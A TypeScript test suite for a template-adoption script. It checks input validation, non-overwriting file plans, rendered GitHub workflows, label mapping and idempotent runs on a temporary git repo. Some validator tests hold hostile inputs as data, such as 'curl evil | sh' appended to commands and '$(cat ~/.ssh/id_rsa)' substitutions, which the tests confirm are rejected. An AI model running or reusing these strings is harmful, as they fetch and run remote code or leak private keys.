// /adt:adopt (plugins/adt, template-only): answers, the plan (add / identical / conflict, never overwrite), the rendered
// observe-mode workflows, the label map, and the real script applied twice on a git project. The real run is the
// GoAgentic rehearsal (docs/missions/0021-adopt.md).

import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import {
  LABEL_ROLES,
  adaptReviewConfig,
  adaptText,
  fill,
  invariantOwners,
  placeholderValues,
  planFiles,
  validateAdoptAnswers,
} from "../../plugins/adt/scripts/lib/adopt.ts";
import type { AdoptAnswers, Kit } from "../../plugins/adt/scripts/lib/adopt.ts";

const RAW = {
  owner: "maria",
  labels: "invariantApproved=invariante-aprovado,rereview=revisar-de-novo",
  prd: "specs/PRD.md",
  handoff: "HANDOFF.md",
  invariants: "tests/invariants",
  evalCommand: "npm run eval:agent -- --mock",
  evalPaths: "src/lib/ai/**,tests/evals/**",
  required: "Application and database",
  sensitive: "supabase/migrations/**",
  e2eStart: "npm start",
  e2ePort: "3100",
  e2eEnv: "APP_ENV=e2e,SMTP_HOST=",
};
const answers = (over: Record<string, string> = {}): AdoptAnswers => {
  const a = validateAdoptAnswers({ ...RAW, ...over });
  if ("errors" in a) throw new Error(a.errors.join("; "));
  return a.answers;
};
const KIT = JSON.parse(readFileSync("adopt/kit.json", "utf-8")) as Kit;

test("answers: existing label names kept, template names for the rest; closed patterns everywhere", () => {
  const a = answers();
  assert.deepEqual(a.labels, { invariantApproved: "invariante-aprovado", evalApproved: "eval-approved", rereview: "revisar-de-novo", deep: "deep-review", testApproved: "test-approved" });
  assert.deepEqual(a.requiredChecks, ["Application and database"]);
  const errors = (over: Record<string, string>) => {
    const r = validateAdoptAnswers({ ...RAW, ...over });
    return "errors" in r ? r.errors.join("\n") : "";
  };
  assert.match(errors({ evalCommand: "npm run eval -- --mock; curl evil | sh" }), /eval-command/, "no shell in the eval command");
  assert.match(errors({ evalCommand: "npm run eval -- $(cat ~/.ssh/id_rsa)" }), /eval-command/);
  assert.match(errors({ prd: "../outside.md" }), /prd: a relative path/);
  assert.match(errors({ evalPaths: "src/**,../x/**" }), /eval-paths/);
  assert.match(errors({ labels: 'invariantApproved=a"b' }), /needs a label name/);
  assert.match(errors({ labels: "admin=x" }), /unknown role/);
  assert.match(errors({ labels: "rereview=deep-review" }), /each role needs its own label/);
  assert.match(errors({ required: "Application and database,adt-review" }), /observe mode/, "adoption never makes its own checks required");
  assert.match(errors({ owner: "--help" }), /owner/);
});

test("fill: every placeholder needs a value; none is left blank", () => {
  assert.equal(fill("a {{X}} b", { X: "1" }), "a 1 b");
  assert.throws(() => fill("a {{Y}}", { X: "1" }), /No value for the placeholder \{\{Y\}\}/);
  assert.throws(() => fill("a {{E2E_Y}}", { X: "1" }), /No value for the placeholder \{\{E2E_Y\}\}/, "a name with a digit is a placeholder too");
});

test("plan: add what is missing, skip what is identical, report what differs; nothing is overwritten", () => {
  const files = { "a.md": "new", "b.md": "same", "c.md": "kit" };
  const project: Record<string, string> = { "b.md": "same", "c.md": "theirs" };
  assert.deepEqual(planFiles(files, (p) => project[p] ?? null), [
    { path: "a.md", action: "add" },
    { path: "b.md", action: "identical" },
    { path: "c.md", action: "conflict" },
  ]);
});

test("reviewer config: the project's label names, without the template's own paths, plus its sensitive paths", () => {
  const config = JSON.parse(adaptReviewConfig(readFileSync(".github/review.json", "utf-8"), KIT, answers())) as {
    deepLabel: string;
    rereviewLabel: string;
    approvalLabels: string[];
    sensitivePaths: string[];
    tiers: Record<string, { apiKeyEnv: string }>;
  };
  assert.deepEqual([config.deepLabel, config.rereviewLabel, config.approvalLabels], ["deep-review", "revisar-de-novo", ["invariante-aprovado", "eval-approved", "test-approved"]]);
  for (const own of KIT.templateOnlySensitivePaths) assert.ok(!config.sensitivePaths.includes(own), own);
  assert.ok(config.sensitivePaths.includes("tests/invariants/**") && config.sensitivePaths.includes("supabase/migrations/**"));
  assert.deepEqual(Object.values(config.tiers).map((t) => t.apiKeyEnv), ["REVIEW_API_KEY", "REVIEW_API_KEY", "REVIEW_DEEP_API_KEY", "REVIEW_DEEP_API_KEY"]);
  const trivial = (config as unknown as { trivial: { exceptPaths: string[] } }).trivial.exceptPaths;
  assert.ok(trivial.includes("specs/PRD.md") && trivial.includes("HANDOFF.md"), "the PRD and the HANDOFF are never reviewed as trivial");
  const custom = JSON.parse(adaptReviewConfig(readFileSync(".github/review.json", "utf-8"), KIT, answers({ invariants: "test/rules" }))) as {
    autoFix: { neverPaths: string[] };
  };
  assert.ok(custom.autoFix.neverPaths.includes("test/rules/**"), "the implementer never auto-fixes the project's invariants folder");
});

test("the reviewer's dependency: the template's exact SDK version, every package locked with an integrity hash", () => {
  const root = JSON.parse(readFileSync("package.json", "utf-8")) as { dependencies?: Record<string, string>; devDependencies?: Record<string, string> };
  const reviewer = JSON.parse(readFileSync(KIT.files["scripts/review/package.json"] ?? "", "utf-8")) as { dependencies: Record<string, string> };
  const sdk = root.dependencies?.["@anthropic-ai/sdk"] ?? root.devDependencies?.["@anthropic-ai/sdk"];
  assert.deepEqual(reviewer.dependencies, { "@anthropic-ai/sdk": sdk });
  const lock = JSON.parse(readFileSync(KIT.files["scripts/review/package-lock.json"] ?? "", "utf-8")) as { packages: Record<string, { version?: string; integrity?: string }> };
  const installed = Object.entries(lock.packages).filter(([path]) => path.startsWith("node_modules/"));
  assert.ok(installed.length > 0);
  for (const [path, p] of installed) assert.match(p.integrity ?? "", /^sha512-/, `${path} is locked with an integrity hash`);
  assert.equal(lock.packages["node_modules/@anthropic-ai/sdk"]?.version, sdk);
});

test("copied text uses the project's label names and paths", () => {
  const text = adaptText("Apply `invariant-approved`. Update `docs/HANDOFF.md`. Read `specs/PRD.md`. Keep `re-review`.", answers());
  assert.equal(text, "Apply `invariante-aprovado`. Update `HANDOFF.md`. Read `specs/PRD.md`. Keep `revisar-de-novo`.");
  assert.equal(adaptText("- [ ] `npm run test:invariants`:", answers()), "- [ ] the invariant tests (the project's own check command):", "no template npm script the project does not have");
});

test("CODEOWNERS: is the owner covering the invariants folder?", () => {
  assert.deepEqual(invariantOwners("* @team\n/tests/invariants/ @maria @Bob\n", "tests/invariants"), ["maria", "bob"]);
  assert.deepEqual(invariantOwners("/src/ @x\n", "tests/invariants"), []);
  assert.deepEqual(invariantOwners("/tests/ @x # comment\n", "tests/invariants"), ["x"]);
});

test("rendered workflows: observe checks with the project's names, nothing left to fill, the evals only on AI paths", () => {
  const values = placeholderValues(answers(), "v0.3.0");
  const render = (path: string) => fill(readFileSync(KIT.workflows[path] ?? "", "utf-8"), values);
  const review = render(".github/workflows/adt-review.yml");
  const guard = render(".github/workflows/adt-invariants.yml");
  const evals = render(".github/workflows/adt-evals.yml");
  for (const text of [review, guard, evals]) {
    assert.doesNotMatch(text, /\{\{[A-Z][A-Z0-9_]*\}\}/, "no placeholder left (GitHub expressions stay)");
    const used = [...text.matchAll(/secrets\.(\w+)/g)].map((m) => m[1]);
    assert.ok(used.every((name) => name === "REVIEW_API_KEY" || name === "REVIEW_DEEP_API_KEY"), `no other secret is used: ${used.join(", ")}`);
    assert.match(text, /^permissions:\n {2}contents: read$/m, "least privilege by default");
  }
  assert.match(review, /name: adt-review\n/);
  assert.match(review, /npm ci --ignore-scripts --no-audit --no-fund --prefix "\$\{\{ steps\.source\.outputs\.dir \}\}\/scripts\/review"/, "from the reviewer's own lockfile, with no install script");
  assert.equal(review.match(/npm (?:ci|install)/g)?.length, 1, "the project's dependencies are not installed by the reviewer: only its own, in scripts/review");
  assert.match(guard, /INVARIANT_LABEL: "invariante-aprovado"/);
  assert.match(evals, /paths:\n {6}- "src\/lib\/ai\/\*\*"\n {6}- "tests\/evals\/\*\*"\n/);
  assert.match(evals, /run: \|\n {10}npm run eval:agent -- --mock\n/, "a block scalar: `a: b` in the arguments cannot break the YAML");
  assert.match(guard, /INVARIANTS_DIR: "tests\/invariants"/);
  assert.doesNotMatch(evals, /secrets\./, "the evals in CI use no key");
});

// ---------- the real script ----------

function project(files: Record<string, string>) {
  const root = mkdtempSync(join(tmpdir(), "adt-adopt-"));
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), text);
  }
  const git = (...args: string[]) => execFileSync("git", args, { cwd: root, encoding: "utf-8", stdio: "pipe" });
  git("init", "-q", "-b", "main");
  git("add", "-A");
  git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "init");
  git("switch", "-q", "-c", "feat/product");
  return { root, git };
}

const SCRIPT = resolve("plugins/adt/scripts/adopt.ts");
const ARGS = [
  "--kit", resolve("."),
  "--owner", RAW.owner,
  "--labels", RAW.labels,
  "--prd", RAW.prd,
  "--handoff", RAW.handoff,
  "--invariants", RAW.invariants,
  "--eval-command", RAW.evalCommand,
  "--eval-paths", RAW.evalPaths,
  "--required", RAW.required,
  "--e2e-start", RAW.e2eStart,
  "--e2e-port", RAW.e2ePort,
  "--e2e-env", RAW.e2eEnv,
];
const adopt = (root: string, ...args: string[]) => {
  const r = spawnSync("node", [SCRIPT, ...args], { cwd: root, encoding: "utf-8" });
  return { status: r.status, json: JSON.parse(r.stdout || "{}") as { errors?: string[]; written?: string[]; skipped?: string[]; files?: Array<{ path: string; action: string }>; agents?: string } };
};

const AGENTS = "# AGENTS.md\n\n## Inegociáveis do atendente\n\n- Nunca afirmar que é humano.\n";

test("apply: never on the base branch, never over a different file; AGENTS.md keeps every line; a second run writes nothing", () => {
  const { root, git } = project({ "AGENTS.md": AGENTS, "HANDOFF.md": "# Handoff\n", "tests/invariants/a.test.ts": 'it("x", () => {})' });
  try {
    const onBase = adopt(root, "apply", ...ARGS, "--base", "feat/product");
    assert.equal(onBase.status, 1);
    assert.match(onBase.json.errors?.join() ?? "", /never writes on the base or default branch/);

    git("switch", "-q", "-c", "mission/0001-adopt");
    writeFileSync(join(root, "REVIEW.md"), "their own review rules\n");
    git("add", "-A");
    git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "theirs");
    const conflict = adopt(root, "apply", ...ARGS, "--base", "feat/product");
    assert.equal(conflict.status, 1);
    assert.match(conflict.json.errors?.join() ?? "", /REVIEW\.md/);
    assert.equal(git("status", "--porcelain"), "", "nothing written when there is a conflict");
    assert.equal(readFileSync(join(root, "REVIEW.md"), "utf-8"), "their own review rules\n");

    git("rm", "-q", "REVIEW.md");
    git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "drop");
    const plan = adopt(root, "plan", ...ARGS);
    assert.equal(plan.json.agents, "append-section");
    assert.ok(plan.json.files?.every((f) => f.action === "add"));

    const applied = adopt(root, "apply", ...ARGS, "--base", "feat/product");
    assert.equal(applied.status, 0, JSON.stringify(applied.json));
    const agents = readFileSync(join(root, "AGENTS.md"), "utf-8");
    assert.ok(agents.startsWith(AGENTS), "every existing line of AGENTS.md is kept, in place");
    assert.match(agents, /## ai-dev-template workflow/);
    assert.match(agents, /`invariante-aprovado`/);
    assert.match(agents, /`Application and database`/);
    assert.equal(readFileSync(join(root, "HANDOFF.md"), "utf-8"), "# Handoff\n", "the project's HANDOFF is untouched");
    assert.match(readFileSync(join(root, ".github/CODEOWNERS"), "utf-8"), /^\/tests\/invariants\/ @maria$/m);
    assert.match(readFileSync(join(root, "REVIEW.md"), "utf-8"), /`invariante-aprovado`/);
    assert.ok(readFileSync(join(root, "scripts/review/package-lock.json"), "utf-8").includes('"lockfileVersion"'));
    assert.doesNotMatch(readFileSync(join(root, "scripts/guard-invariants.ts"), "utf-8"), /npm run guard:invariants/);
    assert.doesNotMatch(readFileSync(join(root, ".github/pull_request_template.md"), "utf-8"), /npm run test:invariants/);
    const adt = JSON.parse(readFileSync(join(root, ".github/adt.json"), "utf-8")) as { mode: string; requiredChecks: string[]; observeChecks: string[] };
    assert.deepEqual([adt.mode, adt.requiredChecks, adt.observeChecks], ["observe", ["Application and database"], ["adt-review", "adt-invariants", "adt-evals", "adt-e2e"]]);

    git("add", "-A");
    git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "adopt");
    const again = adopt(root, "apply", ...ARGS, "--base", "feat/product");
    assert.equal(again.status, 0);
    assert.deepEqual(again.json.written, [], "idempotent: nothing to add the second time");
    assert.equal(git("status", "--porcelain"), "");
    assert.equal(Object.keys(LABEL_ROLES).length, 5);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("a project without AI code or required checks (M8): no evals check, \"none\" stated plainly, never a fake command", () => {
  const a = answers({ evalCommand: "none", evalPaths: "", required: "none" });
  assert.equal(a.evals, null);
  assert.deepEqual(a.requiredChecks, []);
  const errors = (over: Record<string, string>) => {
    const r = validateAdoptAnswers({ ...RAW, ...over });
    return "errors" in r ? r.errors.join("\n") : "";
  };
  assert.match(errors({ evalCommand: "none" }), /eval-paths: leave it out/, "no AI code means no AI paths");
  assert.match(errors({ required: "" }), /or `none`/);
  const { root, git } = project({ "README.md": "# Bookings\n" });
  try {
    git("switch", "-q", "-c", "mission/0001-adopt");
    const args = ARGS.map((x) => x);
    args.splice(args.indexOf("--eval-command") + 1, 1, "none");
    args.splice(args.indexOf("--eval-paths"), 2);
    args.splice(args.indexOf("--required") + 1, 1, "none");
    args.splice(args.indexOf("--e2e-start") + 1, 1, "none");
    args.splice(args.indexOf("--e2e-port"), 4);
    const applied = adopt(root, "apply", ...args, "--base", "feat/product");
    assert.equal(applied.status, 0, JSON.stringify(applied.json));
    assert.ok(!existsSync(join(root, ".github/workflows/adt-evals.yml")), "no evals workflow without AI code");
    assert.ok(!existsSync(join(root, ".github/workflows/adt-e2e.yml")) && !existsSync(join(root, "e2e")), "no end-to-end tester without a web UI");
    assert.doesNotMatch(readFileSync(join(root, ".github/CODEOWNERS"), "utf-8"), /\/e2e\//);
    assert.ok(existsSync(join(root, ".github/workflows/adt-review.yml")));
    const adt = JSON.parse(readFileSync(join(root, ".github/adt.json"), "utf-8")) as { requiredChecks: string[]; observeChecks: string[]; evals: unknown };
    assert.deepEqual([adt.requiredChecks, adt.observeChecks, adt.evals], [[], ["adt-review", "adt-invariants"], null]);
    const agents = readFileSync(join(root, "AGENTS.md"), "utf-8");
    assert.match(agents, /`adt-review`, `adt-invariants` run on every PR/);
    assert.match(agents, /The required checks stay as they were: none yet\./);
    assert.match(agents, /No evals yet: the project has no AI code/);
    assert.doesNotMatch(agents, /adt-evals` run|Evals in CI run without a model/);
    assert.doesNotMatch(agents, /End-to-end tests/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("the review-handling rule reaches adopted projects: their AGENTS section and the triage script", () => {
  const section = readFileSync(KIT.agentsSection, "utf-8");
  for (const needle of ["fix: address review findings", "scripts/review/triage.ts findings", "scripts/review/triage.ts check-fix", "{{INVARIANTS_DIR}}/", "{{REREVIEW_LABEL}}"]) {
    assert.ok(section.includes(needle), needle);
  }
  assert.ok(KIT.copy.includes("scripts/review/triage.ts"));
});

test("the end-to-end tester (M8): a self-contained e2e/, the project's label, the app's isolated start; nothing can break out of the config", () => {
  const errors = (over: Record<string, string>) => {
    const r = validateAdoptAnswers({ ...RAW, ...over });
    return "errors" in r ? r.errors.join("\n") : "";
  };
  assert.match(errors({ e2eStart: "npm start; curl evil | sh" }), /e2e-start/, "no shell in the start command");
  assert.match(errors({ e2eStart: 'node "x' }), /e2e-start/);
  assert.match(errors({ e2ePort: "80" }), /e2e-port/);
  assert.match(errors({ e2eEnv: "lower=x" }), /e2e-env/);
  assert.match(errors({ e2eEnv: "PORT=1" }), /PORT comes from e2e-port/);
  assert.match(errors({ e2eEnv: "TOKEN=$(cat ~/.ssh/id_rsa)" }), /e2e-env/);
  assert.match(errors({ e2eStart: "none" }), /leave them out when e2e-start is `none`/);
  assert.equal(answers({ e2eStart: "none", e2ePort: "", e2eEnv: "" }).e2e, null);
  assert.deepEqual(answers().e2e, { start: "npm start", port: 3100, env: { APP_ENV: "e2e", SMTP_HOST: "" } });

  const values = placeholderValues(answers({ labels: "testApproved=teste-aprovado" }), "v0.4.0");
  const config = fill(readFileSync(KIT.e2e.filled["e2e/playwright.config.ts"] ?? "", "utf-8"), values);
  assert.match(config, /command: "npm start",/);
  assert.match(config, /env: \{ APP_ENV: "e2e", SMTP_HOST: "", PORT: String\(PORT\) \}/, "an empty value unsets a real service's setting");
  assert.match(config, /process\.env\.E2E_PORT \?\? 3100/);
  assert.match(config, /reuseExistingServer: false/);
  const workflow = fill(readFileSync(KIT.e2e.filled[".github/workflows/adt-e2e.yml"] ?? "", "utf-8"), values);
  for (const text of [config, workflow]) assert.doesNotMatch(text, /\{\{[A-Z][A-Z0-9_]*\}\}/);
  assert.match(workflow, /name: adt-e2e\n/);
  assert.match(workflow, /^permissions:\n {2}contents: read$/m);
  assert.doesNotMatch(workflow, /secrets\./, "no secret reaches the end-to-end job");
  assert.match(workflow, /E2E_APPROVAL_LABEL: "teste-aprovado"/);
  assert.ok(workflow.indexOf("node \"$GUARD\"") < workflow.indexOf("npm ci"), "the guard runs before any install");
  for (const install of workflow.match(/npm ci[^\n]*/g) ?? []) assert.match(install, /--ignore-scripts/, install);

  // The tester's own dependencies: the template's exact Playwright and TypeScript, every package locked with an integrity hash.
  const root = JSON.parse(readFileSync("package.json", "utf-8")) as { devDependencies: Record<string, string> };
  const pkg = JSON.parse(readFileSync(KIT.e2e.files["e2e/package.json"] ?? "", "utf-8")) as { devDependencies: Record<string, string> };
  assert.deepEqual(pkg.devDependencies, { "@playwright/test": root.devDependencies["@playwright/test"], typescript: root.devDependencies.typescript });
  const lock = JSON.parse(readFileSync(KIT.e2e.files["e2e/package-lock.json"] ?? "", "utf-8")) as { packages: Record<string, { version?: string; integrity?: string }> };
  for (const [path, p] of Object.entries(lock.packages).filter(([path]) => path.startsWith("node_modules/"))) assert.match(p.integrity ?? "", /^sha512-/, path);
  assert.equal(lock.packages["node_modules/@playwright/test"]?.version, root.devDependencies["@playwright/test"]);

  const { root: dir, git } = project({ "README.md": "# Bookings\n" });
  try {
    git("switch", "-q", "-c", "mission/0001-adopt");
    const applied = adopt(dir, "apply", ...ARGS.map((x) => (x === RAW.labels ? `${RAW.labels},testApproved=teste-aprovado` : x)), "--base", "feat/product");
    assert.equal(applied.status, 0, JSON.stringify(applied.json));
    for (const path of ["e2e/playwright.config.ts", "e2e/fixtures.ts", "e2e/seed.spec.ts", "e2e/package.json", "e2e/package-lock.json", "e2e/.gitignore", ".mcp.json", "scripts/guard-e2e.ts", "scripts/e2e-flaky.ts", ".github/workflows/adt-e2e.yml"]) {
      assert.ok(applied.json.written?.includes(path), path);
    }
    const healer = readFileSync(join(dir, ".claude/agents/playwright-test-healer.md"), "utf-8");
    assert.match(healer, /`teste-aprovado` label/);
    assert.doesNotMatch(healer, /test-approved|fake AI provider/);
    assert.doesNotMatch(readFileSync(join(dir, "e2e/fixtures.ts"), "utf-8"), /demo app/);
    assert.match(readFileSync(join(dir, ".mcp.json"), "utf-8"), /"--prefix", "e2e"/);
    assert.match(readFileSync(join(dir, ".github/CODEOWNERS"), "utf-8"), /^\/e2e\/ @maria$/m);
    const agents = readFileSync(join(dir, "AGENTS.md"), "utf-8");
    assert.match(agents, /\n\n### End-to-end tests\n/);
    assert.match(agents, /needs the owner's `teste-aprovado` label/);
    assert.match(agents, /`adt-review`, `adt-invariants`, `adt-evals`, `adt-e2e` run on every PR/);
    assert.ok(!existsSync(join(dir, "package.json")), "the project's package.json is never created or changed");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
